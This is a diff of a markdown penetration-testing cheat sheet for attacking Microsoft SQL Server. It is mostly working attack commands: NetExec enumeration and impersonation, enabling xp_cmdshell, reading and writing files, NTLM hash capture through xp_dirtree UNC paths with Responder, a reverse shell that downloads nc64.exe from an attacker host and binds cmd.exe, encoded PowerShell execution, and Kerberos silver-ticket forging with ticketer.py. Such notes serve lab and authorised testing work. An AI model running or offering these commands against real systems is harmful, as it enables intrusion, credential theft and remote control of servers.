@@ -13,9 +13,9 @@ excerpt: "Technical understanding and practical overview"
 > Microsoft SQL Server is a relational database management system (RDBMS) developed by Microsoft, designed to manage and organize data in a structured way using tables that are related to each > other through defined relationships.
 > It allows applications and users to store, retrieve, update, and manage data efficiently using Transact-SQL (T-SQL), Microsoft’s implementation of the SQL language.
 
-[Resource](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)
+[Payload all the thinks...](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)
 
-###  [+]  Connecting to mssqlclient 
+# Connecting to mssqlclient 
 ```bash
 NetExec mssql $target -u '$user' -p '$pass' --local-auth
 
@@ -38,7 +38,7 @@ enum_db
 # check linked servers
 enum_links
 ```
-### [+] Database usage 
+### Database usage 
 ```bash
 enum_db                         #show databases
 use <db_name>;                  #use it
@@ -48,12 +48,10 @@ select * from <table_name>;     #show content
 SELECT * FROM INFORMATION_SCHEMA.TABLES;
 ```
 ## Enable xp_cmdshell
-1.
 ```bash
 enable_xp_cmdshell
 xp_cmdshell whoami
 ```
-2.
 ```bash
 EXEC sp_configure 'show advanced options', 1;
 RECONFIGURE;
@@ -64,52 +62,79 @@ EXEC xp_cmdshell 'whoami';
 ```
 
 ## Common Check's
-[+]  Logged in users:
+### Logged in users:
 ```bash
 nxc mssql DC01 -u '$user' -p '$pass' --local-auth -M enum_logins
 ```
-[+] check impersonate user
+### check impersonate user
 ```bash
 nxc mssql DC01 -u '$user' -p '$pass' --local-auth -M enum_impersonate
 ```
-[+] impersonate user
+### impersonate user
 ```bash
 nxc mssql DC01 -u '$user' -p 'pass' --local-auth -M mssql_priv
 ```
-###  [-]  Reading  $SID
+# Reading
+##  Reading  $SID
 ```bash
  EXEC xp_cmdshell 'whoami';
 
  SELECT SUSER_SID('use_name'); 
  ```
-### [-]  Reading  files
+## Reading  files
 ```bash
 SELECT * FROM OPENROWSET(BULK 'C:\Windows\system32\drivers\etc\hosts', SINGLE_CLOB) AS Contents;
 ```
+# Writing
+## Writing files
+[More ways to write file]()
+```bash
+execute spWriteStringToFile 'contents', 'C:\path\to\', 'file'
+```
+## PowerupSQL Writebulksert.sql
+[Resource link](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/tsql/writefile_bulkinsert.sql#L15)
+```bash
+-- author: antti rantassari, 2017
+-- Description: Copy file contents to another file via local, unc, or webdav path
+-- summary = file contains varchar data, field is an int, throws casting error on read, set error output to file, tada!
+-- requires sysadmin or bulk insert privs
 
-### [+] Capture NTLM Hash. (LLMNR Poisoning)
+create table #errortable (ignore int)
+
+bulk insert #errortable
+from '\\localhost\c$\windows\win.ini' -- or  'c:\windows\system32\win.ni' -- or \\hostanme@SSL\folder\file.ini' 
+with
+(
+fieldterminator=',',
+rowterminator='\n',
+errorfile='c:\windows\temp\thatjusthappend.txt'
+)
+
+drop table #errortable
+```
+
+# Capture NTLM Hash (LMNR Poisoning)
+This also called as the unc PathInjection.[PowerupSQL Cheatsheet](https://github.com/NetSPI/PowerUpSQL/blob/master/templates/CheatSheet_UncPathInjection.txt)
 ```bash
 responder -I tun0 -dvw
 
- 
+
 declare @q varchar (200);set @q='\\$IP\any\think';exec master.dbo.xp_dirtree @q;
-
 exec master ..xp_dirtree '\\$IP\test';
-
 SELECT * FROM sys.dm_os_file_exists('\\ip\\share\it');
 ```
-### [+] Checking link_server's
+### Checking link_server's
 ```bash
 EXEC sp_linkedservers
 enum_links
 ```
-[+] Use the linked_Server's
+`Use the linked_Server's`
 ```bash
 use_link [Server_Name]; 
   or 
 use_link Server_Name
 ```
-### [+] Execute the xp_cmdshell
+### Execute the xp_cmdshell
 ```bash
 EXEC ('EXEC xp_cmdshell whoami;')
 xp_cmdshell whoami
@@ -121,7 +146,7 @@ xp_cmdshell whoami
 + EXEC ('EXEC xp_cmdshell  "powershell whoami";')      
 ```
 
-## [+] Reverse shell via nc64.exe
+## Reverse shell via nc64.exe
 ```bash
 EXECUTE ('EXEC xp_cmdshell ''powershell -c "& {iwr -uri http://$attcker_ip:8000/nc64.exe -outfile C:\Windows\Temp\nc.exe}"''')
 
@@ -130,7 +155,7 @@ rlwrap ncat -lvnp 9001
 EXECUTE('EXEC xp_cmdshell ''C:\Windows\Temp\nc.exe -e cmd.exe $attacker 9001''')
 ```
 
-## [+] Powershell Execution
+## Powershell Execution
 > Raw code creation:- Use the nishang (tcponelinear.ps1).
 
 
@@ -143,7 +168,7 @@ cat file_name |iconv -t utf-16le | base64 -w0;echo
  EXEC ('EXEC xp_cmdshell  "powershell -enc <encoded_raw_code>";')
  ```
 
-## [+]  Enable the xp_cmdshell
+## Enable the xp_cmdshell
 
 ```bash
 EXEC sp_configure 'show advanced options', 1;         
@@ -162,14 +187,12 @@ exec xp_cmdshell 'powershell -enc <encoded_raw_code>'
 
 ### Generate Nthash
 ```bash
-└─# python3                
-Python 3.13.11 (main, Dec  8 2025, 11:43:54) [GCC 15.2.0] on linux
-Type "help", "copyright", "credits" or "license" for more information.
+└─# python3
 >>> import hashlib
 >>> hashlib.new('md4', 'password_here'.encode('utf-16le')).digest().hex()
 ```
 ```bash
-ticketer.py -nthash $nthash -domain-sid $sid -domain $Domain -spn $user/$Full_DOmain:$Port -groups 1105 -user-id 500 Administrator
+ticketer.py -nthash $nthash -domain-sid $sid -domain $Domain -spn $user/$Full_DOmain:$Port -user-id 500 Administrator
 ```
 ```bash
 export KRB5CCNAME=Administrator.ccache
